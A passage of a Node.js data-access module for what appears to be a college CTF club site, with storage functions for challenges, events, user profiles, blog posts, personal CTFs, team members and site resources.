// databases or if it was somehow removed (handles existing data.db.json files).
function ensureGhostChallenge() {
  if (!db.challenges) db.challenges = [];
  if (db.challenges.some(c => c.ghost || c.title === 'Ghost Protocol')) return;
  const ghost = { ...GHOST_CHALLENGE, id: db.nextChallengeId++ };
  db.challenges.push(ghost);
  save(db);
  return ghost;
}

// ─── CHALLENGES (admin CRUD) ──────────────────────────────────────────────

function getAllChallenges() {
  return db.challenges;
}

function getChallengeById(id) {
  return db.challenges.find(c => c.id === id);
}

function createChallenge({ title, category, points, difficulty, description, hint, flag }) {
  const challenge = {
    id: db.nextChallengeId++,
    title,
    category: category || 'Misc',
    points: parseInt(points) || 0,
    difficulty: difficulty || 'Medium',
    description: description || '',
    hint: hint || '',
    flag: flag || '',
    solvedCount: 0,
  };
  db.challenges.push(challenge);
  save(db);
  return challenge;
}

function updateChallenge(id, data) {
  const idx = db.challenges.findIndex(c => c.id === id);
  if (idx === -1) return null;
  const updated = { ...db.challenges[idx], ...data, id: db.challenges[idx].id };
  db.challenges[idx] = updated;
  save(db);
  return updated;
}

function deleteChallenge(id) {
  const before = db.challenges.length;
  db.challenges = db.challenges.filter(c => c.id !== id);
  save(db);
  return db.challenges.length < before;
}

// ─── EVENTS (admin CRUD) ────────────────────────────────────────────────

function getAllEvents() {
  return db.events;
}

function getEventById(id) {
  return db.events.find(e => e.id === id);
}

function createEvent({ title, date, startTime, endTime, location, type, description, category, participants, coverPhoto }) {
  const event = {
    id: db.nextEventId++,
    title,
    date: date || new Date().toISOString().split('T')[0],
    startTime: startTime || '',
    endTime: endTime || '',
    location: location || '',
    type: type || 'upcoming',
    description: description || '',
    category: category || 'Workshop',
    participants: parseInt(participants) || 0,
    coverPhoto: coverPhoto || null,
    createdAt: new Date().toISOString(),
  };
  db.events.push(event);
  save(db);
  return event;
}

function updateEvent(id, data) {
  const idx = db.events.findIndex(e => e.id === id);
  if (idx === -1) return null;
  const updated = { ...db.events[idx], ...data, id: db.events[idx].id };
  db.events[idx] = updated;
  save(db);
  return updated;
}

// Ensure seeded events get a coverPhoto field (fills it in for old data files)
function ensureEventCoverPhotos() {
  let changed = false;
  (db.events || []).forEach(e => {
    if (e.coverPhoto === undefined) {
      e.coverPhoto = null;
      changed = true;
    }
  });
  if (changed) save(db);
  return db.events;
}

function deleteEvent(id) {
  const before = db.events.length;
  db.events = db.events.filter(e => e.id !== id);
  save(db);
  return db.events.length < before;
}

// ─── USER PROFILES (public) ──────────────────────────────────────────────

function getUserProfile(username, pointsByChallengeId) {
  const user = db.users.find(u => u.username.toLowerCase() === username.toLowerCase());
  if (!user) return null;

  // All submissions by this user, most recent first
  const submissions = db.submissions
    .filter(s => s.username === user.username)
    .sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp))
    .map(s => ({
      id: s.id,
      challengeId: s.challengeId,
      correct: s.correct,
      timestamp: s.timestamp,
      challengeTitle: db.challenges.find(c => c.id === s.challengeId)?.title || `Challenge #${s.challengeId}`,
      challengeCategory: db.challenges.find(c => c.id === s.challengeId)?.category || 'Unknown',
      points: s.correct ? (pointsByChallengeId[s.challengeId] || 0) : 0,
    }));

  // Correct submissions (solved challenges)
  const correctSubmissions = submissions.filter(s => s.correct);
  const solvedChallengeIds = [...new Set(correctSubmissions.map(s => s.challengeId))];

  // Solved challenges with full details
  const solvedChallenges = solvedChallengeIds.map(cId => {
    const challenge = db.challenges.find(c => c.id === cId);
    return challenge ? {
      id: challenge.id,
      title: challenge.title,
      category: challenge.category,
      points: challenge.points,
      difficulty: challenge.difficulty,
      solvedAt: correctSubmissions.find(s => s.challengeId === cId)?.timestamp || null,
    } : null;
  }).filter(Boolean);

  // Total score
  const totalScore = correctSubmissions.reduce((sum, s) => sum + (s.points || 0), 0);

  // Calculate rank
  const leaderboard = db.users.map(u => {
    const userCorrect = db.submissions.filter(sub => sub.username === u.username && sub.correct);
    const score = userCorrect.reduce((sum, sub) => sum + (pointsByChallengeId[sub.challengeId] || 0), 0);
    return { username: u.username, score };
  }).sort((a, b) => b.score - a.score);
  const rank = leaderboard.findIndex(e => e.username === user.username) + 1;

  // Stats by category
  const categoryStats = {};
  solvedChallenges.forEach(ch => {
    if (!categoryStats[ch.category]) categoryStats[ch.category] = { count: 0, points: 0 };
    categoryStats[ch.category].count++;
    categoryStats[ch.category].points += ch.points;
  });

  // Recent activity (last 10 submissions)
  const recentActivity = submissions.slice(0, 10);

  // Wrong attempts count
  const wrongAttempts = submissions.filter(s => !s.correct).length;

  // ─── Personal CTF History ──────────────────────────────────────────────────
  const personalCtfHistory = (db.personalCtfs || [])
    .filter(p => p.participants && p.participants.some(pt => pt.username === user.username))
    .map(p => {
      const userSubs = (p.submissions || []).filter(s => s.username === user.username);
      const correctSubs = userSubs.filter(s => s.correct);
      const solvedIds = [...new Set(correctSubs.map(s => s.challengeIdx))];
      const score = correctSubs.reduce((sum, s) => sum + (s.points || 0), 0);
      return {
        id: p.id,
        title: p.title,
        accessId: p.accessId,
        status: new Date() >= new Date(p.startsAt)
          ? (new Date() <= new Date(p.endsAt) ? 'active' : 'ended')
          : 'upcoming',
        startsAt: p.startsAt,
        endsAt: p.endsAt,
        challengeCount: (p.challenges || []).length,
        score,
        solvedCount: solvedIds.length,
        totalSubmissions: userSubs.length,
        joinedAt: p.participants.find(pt => pt.username === user.username)?.joinedAt || null,
      };
    })
    .sort((a, b) => new Date(b.startsAt) - new Date(a.startsAt));

  return {
    username: user.username,
    email: user.email,
    college: user.college,
    joinedAt: user.joinedAt,
    stats: {
      totalScore,
      solvedCount: solvedChallenges.length,
      totalSubmissions: submissions.length,
      wrongAttempts,
      rank: rank > 0 ? rank : null,
      totalPlayers: db.users.length,
    },
    solvedChallenges,
    recentActivity,
    categoryStats,
    personalCtfHistory,
  };
}

// ─── BLOG POSTS (admin CRUD, public read) ────────────────────────────────

function getAllBlogPosts() {
  return [...db.blogPosts]
    .sort((a, b) => new Date(b.createdAt) - new Date(a.createdAt));
}

function getPublishedBlogPosts() {
  return getAllBlogPosts().filter(p => p.published);
}

function getBlogPostBySlug(slug) {
  return db.blogPosts.find(p => p.slug === slug);
}

function getBlogPostById(id) {
  return db.blogPosts.find(p => p.id === id);
}

function createBlogPost({ title, content, excerpt, author, tags }) {
  const rawSlug = title
    ? title.toLowerCase().replace(/[^a-z0-9]+/g, '-').replace(/^-|-$/g, '')
    : '';
  const slug = rawSlug || `post-${db.nextBlogPostId}`;
  const post = {
    id: db.nextBlogPostId++,
    title: title || 'Untitled',
    slug,
    content: content || '',
    excerpt: excerpt || content.substring(0, 200).replace(/[#*`]/g, '') + '...',
    author: author || 'Admin',
    tags: tags || [],
    published: false,
    createdAt: new Date().toISOString(),
    updatedAt: new Date().toISOString(),
  };
  db.blogPosts.push(post);
  save(db);
  return post;
}

function updateBlogPost(id, data) {
  const idx = db.blogPosts.findIndex(p => p.id === id);
  if (idx === -1) return null;
  const updated = {
    ...db.blogPosts[idx],
    ...data,
    id: db.blogPosts[idx].id,
    slug: data.title
      ? data.title.toLowerCase().replace(/[^a-z0-9]+/g, '-').replace(/^-|-$/g, '')
      : db.blogPosts[idx].slug,
    updatedAt: new Date().toISOString(),
  };
  db.blogPosts[idx] = updated;
  save(db);
  return updated;
}

function deleteBlogPost(id) {
  const before = db.blogPosts.length;
  db.blogPosts = db.blogPosts.filter(p => p.id !== id);
  save(db);
  return db.blogPosts.length < before;
}

// ─── GHOST PROTOCOL WALL OF FAME ──────────────────────────────────────────

function addGhostCompletion({ alias }) {
  // Prevent alias squatting: same alias can't be registered twice
  const existing = db.ghostCompletions.find(
    c => c.alias.toLowerCase() === (alias || '').toLowerCase()
  );
  if (existing) return existing;

  const entry = {
    id: db.nextGhostId++,
    alias: alias || 'Anonymous Ghost',
    completedAt: new Date().toISOString(),
  };
  db.ghostCompletions.push(entry);
  save(db);
  return entry;
}

function getAllGhostCompletions() {
  return [...db.ghostCompletions]
    .sort((a, b) => new Date(b.completedAt) - new Date(a.completedAt));
}

function getGhostCompletionCount() {
  return db.ghostCompletions.length;
}

// ─── WEEKLY ACTIVE PLAYERS (admin stats) ─────────────────────────────────

// ─── CHALLENGE RESET / ARCHIVE ─────────────────────────────────────────

function archiveChallenges() {
  // Permanent challenges (e.g. Ghost Protocol) always stay on the board
  const permanent = (db.challenges || []).filter(c => c.permanent);
  const regular = (db.challenges || []).filter(c => !c.permanent);
  if (regular.length === 0) return { archived: false, message: 'No challenges to archive.' };

  const now = new Date();
  const weekStart = getStartOfWeek(now);
  const weekEnd = new Date(weekStart);
  weekEnd.setDate(weekEnd.getDate() + 7);

  const weekLabel = `${weekStart.toLocaleDateString('en-IN', { day: '2-digit', month: 'short' })} - ${weekEnd.toLocaleDateString('en-IN', { day: '2-digit', month: 'short', year: 'numeric' })}`;

  const archiveEntry = {
    archivedAt: now.toISOString(),
    weekLabel,
    challenges: regular,
  };

  if (!db.archivedChallenges) db.archivedChallenges = [];
  db.archivedChallenges.unshift(archiveEntry);

  // Keep permanent challenges, reset the counter above the highest remaining id
  db.challenges = permanent;
  db.nextChallengeId = (permanent.length ? Math.max(...permanent.map(c => c.id)) : 0) + 1;

  save(db);
  return { archived: true, weekLabel, count: regular.length };
}

function getArchivedChallenges() {
  return db.archivedChallenges || [];
}

function getWeeklyActivePlayers() {
  const weekStart = getStartOfWeek();
  const weekEnd = new Date(weekStart);
  weekEnd.setDate(weekEnd.getDate() + 7);

  const active = new Set();
  db.submissions.filter(s => {
    const t = new Date(s.timestamp);
    return s.correct && t >= weekStart && t < weekEnd;
  }).forEach(s => active.add(s.username));

  return active.size;
}

// ─── PERSONAL CTFs ────────────────────────────────────────────────────────

function getAllPersonalCtfs() {
  return [...(db.personalCtfs || [])]
    .map(p => ({
      ...p,
      // Status is computed server-side based on time
      status: new Date() >= new Date(p.startsAt)
        ? (new Date() <= new Date(p.endsAt) ? 'active' : 'ended')
        : 'upcoming',
    }))
    .sort((a, b) => new Date(b.createdAt) - new Date(a.createdAt));
}

function getPersonalCtfById(id) {
  return (db.personalCtfs || []).find(p => p.id === id);
}

function findPersonalCtfByAccessId(accessId) {
  return (db.personalCtfs || []).find(
    p => p.accessId.toLowerCase() === (accessId || '').toLowerCase()
  );
}

function createPersonalCtf({ title, description, accessId, accessPassword, startsAt, endsAt, challenges, createdBy }) {
  const ctf = {
    id: db.nextPersonalCtfId++,
    title: title || 'Untitled CTF',
    description: description || '',
    accessId: accessId || `CTF-${db.nextPersonalCtfId - 1}`,
    accessPassword: accessPassword || 'changeme',
    startsAt: startsAt || new Date().toISOString(),
    endsAt: endsAt || new Date(Date.now() + 86400000).toISOString(), // default: 24h
    createdBy: createdBy || 'admin',
    challenges: challenges || [],
    participants: [],
    submissions: [],
    createdAt: new Date().toISOString(),
  };
  // Ensure endsAt is after startsAt (at least 1 minute)
  const startTime = new Date(ctf.startsAt).getTime();
  const endTime = new Date(ctf.endsAt).getTime();
  if (endTime - startTime < 60000) {
    ctf.endsAt = new Date(startTime + 3600000).toISOString(); // default min 1h
  }
  if (!db.personalCtfs) db.personalCtfs = [];
  db.personalCtfs.push(ctf);
  save(db);
  return ctf;
}

function updatePersonalCtf(id, data) {
  const idx = (db.personalCtfs || []).findIndex(p => p.id === id);
  if (idx === -1) return null;
  const updated = { ...db.personalCtfs[idx], ...data, id: db.personalCtfs[idx].id };
  db.personalCtfs[idx] = updated;
  save(db);
  return updated;
}

function deletePersonalCtf(id) {
  const before = (db.personalCtfs || []).length;
  db.personalCtfs = (db.personalCtfs || []).filter(p => p.id !== id);
  save(db);
  return db.personalCtfs.length < before;
}

function joinPersonalCtf(ctfId, userId, username) {
  const ctf = (db.personalCtfs || []).find(p => p.id === ctfId);
  if (!ctf) return { success: false, message: 'CTF not found.' };

  // Check if already joined
  if (ctf.participants.some(p => p.userId === userId)) {
    return { success: true, message: 'Already joined!' };
  }

  ctf.participants.push({ userId, username, joinedAt: new Date().toISOString() });
  save(db);
  return { success: true, message: 'Joined successfully!' };
}

function hasSolvedPersonalCtfChallenge(ctfId, username, challengeIdx) {
  const ctf = (db.personalCtfs || []).find(p => p.id === ctfId);
  if (!ctf) return false;
  return ctf.submissions.some(
    s => s.username === username && s.challengeIdx === challengeIdx && s.correct
  );
}

function addPersonalCtfSubmission(ctfId, username, challengeIdx, correct, points) {
  const ctf = (db.personalCtfs || []).find(p => p.id === ctfId);
  if (!ctf) return null;

  const submission = {
    id: ctf.submissions.length + 1,
    username,
    challengeIdx,
    correct,
    points: correct ? points : 0,
    timestamp: new Date().toISOString(),
  };
  ctf.submissions.push(submission);
  save(db);
  return submission;
}

function getPersonalCtfLeaderboard(ctfId) {
  const ctf = (db.personalCtfs || []).find(p => p.id === ctfId);
  if (!ctf) return [];

  const scoreByUsername = {};
  const solvedByUsername = {};

  ctf.submissions.filter(s => s.correct).forEach(s => {
    scoreByUsername[s.username] = (scoreByUsername[s.username] || 0) + (s.points || 0);
    solvedByUsername[s.username] = (solvedByUsername[s.username] || 0) + 1;
  });

  return ctf.participants.map(p => ({
    username: p.username,
    score: scoreByUsername[p.username] || 0,
    solved: solvedByUsername[p.username] || 0,
    joinedAt: p.joinedAt,
  })).sort((a, b) => b.score - a.score || b.solved - a.solved);
}

// ─── TEAM MEMBERS (admin CRUD, public read) ────────────────────────────────

// Normalizes a social/profile URL. Accepts a full URL, a bare domain, or a
// bare username/handle ("mehak", "@mehak", "ashutosh.ig") and expands it to
// a full URL. A dot alone isn't enough to count as a URL — Instagram-style
// usernames contain dots — so only values with a path, "www.", or a common
// TLD are treated as bare domains.
function normalizeLink(platform, value) {
  if (value === undefined || value === null) return '';
  let v = String(value).trim();
  if (!v) return '';
  if (/^https?:\/\//i.test(v)) return v;
  v = v.replace(/^@+/, '');
  const looksLikeDomain = /\/|^www\./i.test(v) || /\.(com|in|org|net|io|dev|me|co|edu|gov|uk|de|fr|au|ca|xyz|app|site|tech|blog)$/i.test(v);
  if (looksLikeDomain) {
    return 'https://' + v;
  }
  const bases = {
    linkedin: 'https://www.linkedin.com/in/',
    github: 'https://github.com/',
    instagram: 'https://www.instagram.com/',
    twitter: 'https://x.com/',
  };
  const url = (bases[platform] || '') + v;
  // Guarantee only http(s) URLs survive — this value ends up in an <a href>.
  return /^https?:\/\//i.test(url) ? url : '';
}

function getAllTeamMembers() {
  return [...(db.teamMembers || [])].sort((a, b) => {
    const sectionOrder = { leadership: 0, core: 1 };
    const s = (sectionOrder[a.section] ?? 2) - (sectionOrder[b.section] ?? 2);
    if (s !== 0) return s;
    return (a.order || 0) - (b.order || 0);
  });
}

function getTeamMemberById(id) {
  return (db.teamMembers || []).find(m => m.id === id);
}

function createTeamMember({ name, role, avatar, bio, social, section, photo, linkedin, github, instagram, email }) {
  const member = {
    id: db.nextTeamMemberId++,
    name: name || 'New Member',
    role: role || 'Core Team',
    avatar: avatar || (name || 'N').trim().charAt(0).toUpperCase(),
    bio: bio || '',
    social: social || '',
    section: section === 'leadership' ? 'leadership' : 'core',
    order: (db.teamMembers || []).length + 1,
    photo: photo || '',
    linkedin: normalizeLink('linkedin', linkedin),
    github: normalizeLink('github', github),
    instagram: normalizeLink('instagram', instagram),
    email: email ? String(email).trim() : '',
  };
  if (!db.teamMembers) db.teamMembers = [];
  db.teamMembers.push(member);
  save(db);
  return member;
}

function updateTeamMember(id, data) {
  const idx = (db.teamMembers || []).findIndex(m => m.id === id);
  if (idx === -1) return null;
  const normalized = { ...data };
  if (normalized.linkedin !== undefined) normalized.linkedin = normalizeLink('linkedin', normalized.linkedin);
  if (normalized.github !== undefined) normalized.github = normalizeLink('github', normalized.github);
  if (normalized.instagram !== undefined) normalized.instagram = normalizeLink('instagram', normalized.instagram);
  if (normalized.email !== undefined) normalized.email = normalized.email ? String(normalized.email).trim() : '';
  const updated = { ...db.teamMembers[idx], ...normalized, id: db.teamMembers[idx].id };
  if (data.name && !data.avatar) {
    updated.avatar = data.name.trim().charAt(0).toUpperCase();
  }
  db.teamMembers[idx] = updated;
  save(db);
  return updated;
}

function deleteTeamMember(id) {
  const before = (db.teamMembers || []).length;
  db.teamMembers = (db.teamMembers || []).filter(m => m.id !== id);
  save(db);
  return db.teamMembers.length < before;
}

// ─── SITE CONTENT (admin edit, public read) ────────────────────────────────

function getSiteContent() {
  return db.siteContent || {};
}

function updateSiteContent(data) {
  db.siteContent = {
    ...(db.siteContent || {}),
    ...(data.stats !== undefined && { stats: data.stats }),
    ...(data.features !== undefined && { features: data.features }),
    ...(data.about !== undefined && { about: { ...(db.siteContent?.about || {}), ...data.about } }),
  };
  save(db);
  return db.siteContent;
}

// ─── RESOURCES (admin CRUD, public read) ───────────────────────────────────

function getAllResources() {
  return db.resources || [];
}

function getResourceById(id) {
  return (db.resources || []).find(r => r.id === id);
}

function createResource({ category, title, desc, code, links }) {
  const resource = {
    id: `res-${Date.now()}-${Math.round(Math.random() * 1e6)}`,
    category: category || 'study',
    title: title || 'Untitled Resource',
    desc: desc || '',
    code: code || null,
    links: links || [],
  };
  if (!db.resources) db.resources = [];
  db.resources.push(resource);
  save(db);
  return resource;
}

function updateResource(id, data) {
  const idx = (db.resources || []).findIndex(r => r.id === id);
  if (idx === -1) return null;
  const updated = { ...db.resources[idx], ...data, id: db.resources[idx].id };
  db.resources[idx] = updated;
  save(db);
  return updated;
}

function deleteResource(id) {
  const before = (db.resources || []).length;
  db.resources = (db.resources || []).filter(r => r.id !== id);
  save(db);
  return db.resources.length < before;
}

module.exports = {
  findUserByUsernameOrEmail,
  findUserByUsername,
  findUserById,
  getUserProfile,
  createUser,
  getAllUsers,
  deleteUser,
  updateUser,
  updatePasswordHash,
  findUserByEmail,
  hasAlreadySolved,
  addSubmission,
  getSolvedCount,
  getAllSubmissions,
  getLeaderboard,
  findMemberByUidOrEmail,
  addMember,
  getAllMembers,
  updateMember,
  deleteMember,
  addEventRegistration,
  getAllEventRegistrations,
  deleteEventRegistration,
  getAllGalleryPhotos,
  getGalleryPhotoById,
  getGalleryPhotosByEvent,
  addGalleryPhoto,
  deleteGalleryPhoto,
  getAllChallenges,
  getChallengeById,
  createChallenge,
  updateChallenge,
  deleteChallenge,
  getAllBlogPosts,
  getPublishedBlogPosts,
  getBlogPostBySlug,
  getBlogPostById,
  createBlogPost,
  updateBlogPost,
  deleteBlogPost,
  addGhostCompletion,
  getAllGhostCompletions,
  getGhostCompletionCount,
  getWeeklyLeaderboard,
  getWeeklyActivePlayers,
  archiveChallenges,
  getArchivedChallenges,
  ensureGhostChallenge,
  getAllEvents,
  getEventById,
  createEvent,
  updateEvent,
  deleteEvent,
  ensureEventCoverPhotos,
  getAllPersonalCtfs,
  getPersonalCtfById,
  createPersonalCtf,
  updatePersonalCtf,
  deletePersonalCtf,
  findPersonalCtfByAccessId,
  joinPersonalCtf,
  hasSolvedPersonalCtfChallenge,
  addPersonalCtfSubmission,
  getPersonalCtfLeaderboard,
  getAllTeamMembers,
  getTeamMemberById,
  createTeamMember,
  updateTeamMember,
  deleteTeamMember,
  getSiteContent,
  updateSiteContent,
  getAllResources,
  getResourceById,
  createResource,
  updateResource,
  deleteResource,
};
